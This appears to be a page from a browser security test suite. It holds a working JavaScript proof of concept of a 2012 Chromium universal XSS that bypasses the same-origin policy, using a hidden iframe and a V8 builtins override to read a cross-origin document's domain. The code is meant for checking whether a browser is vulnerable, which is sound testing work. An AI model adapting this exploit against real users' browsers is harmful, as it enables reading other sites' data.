---
layout: default
title: SOP Bypass - Testcase 18
permalink: /sop/new/18
---

Based upon Chromium UXSS (2012)

<script>
function myfunction() {
    frame = document.body.appendChild(document.createElement("iframe"));
    frame.src = "https://web.archive.org/web/20180831134346/http://www.bing.com/";
    frame.width = '0';
    frame.onload = function() {
        Function("}, (builtins = this), function() {}");
        originalInstantiate = builtins.Instantiate;
        builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {});
        flag = 0;
        template = null;
        builtins.Instantiate = function(x, y) {
            if (flag) {
                doc = frame.contentWindow.document;
                alert(doc.domain);
                flag = 0;
            } else if (!template)
                template = x;
            return originalInstantiate(x, y);
        };
        document.implementation;
        flag = 1;
        builtins.ConfigureTemplateInstance(frame.contentWindow, template);
    }
}
</script>

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()">

**Note:**
If page displays an alert box where document.domain property is pointing to bing.com, your browser is vulnerable to SOP bypass.
